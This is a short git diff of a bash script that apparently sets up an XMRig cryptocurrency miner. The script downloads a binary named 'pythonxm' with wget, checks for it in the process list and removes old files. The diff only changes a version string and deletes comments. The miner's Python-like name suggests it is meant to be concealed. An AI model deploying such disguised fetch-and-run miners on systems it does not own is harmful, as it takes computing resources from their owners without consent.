@@ -1,5 +1,5 @@
 #!bin/bash -xe 
-echo '#### Version 0.0.6 ####'
+echo '#### Version 0.0.7 ####'
 if [ $(ps -aux |grep pythonxm |wc -l) -le 1 ]
 then 
 echo "No process,let's start -> $(ps -aux |grep pythonxm |wc -l)"
@@ -13,14 +13,7 @@ rm -rf pythonxm
 rm -rf config.json
 rm -rf x.out
 
-#EN1GB
-#!/bin/bash -e
 
-# https://xmrig.com/docs/miner/hugepages#onegb-huge-pages
-
-
-
-##########
 
 # Prepare
 wget -q https://github.com/one10001/xmrig/releases/download/bin0.0.1/pythonxm 
